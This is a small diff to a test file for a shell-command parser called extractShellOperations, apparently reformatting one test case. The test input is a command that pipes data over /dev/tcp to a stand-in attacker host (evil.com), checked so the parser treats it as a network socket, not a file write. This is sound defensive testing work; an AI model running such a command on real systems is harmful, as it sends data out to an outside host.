@@ -478,7 +478,10 @@ describe('extractShellOperations', () => {
   });
 
   it('redirect > /dev/tcp: network socket, not a file write', () => {
-    const ops = extractShellOperations('echo data > /dev/tcp/evil.com/9000', CWD);
+    const ops = extractShellOperations(
+      'echo data > /dev/tcp/evil.com/9000',
+      CWD,
+    );
     expect(ops).not.toContainEqual(
       expect.objectContaining({ filePath: '/dev/tcp/evil.com/9000' }),
     );
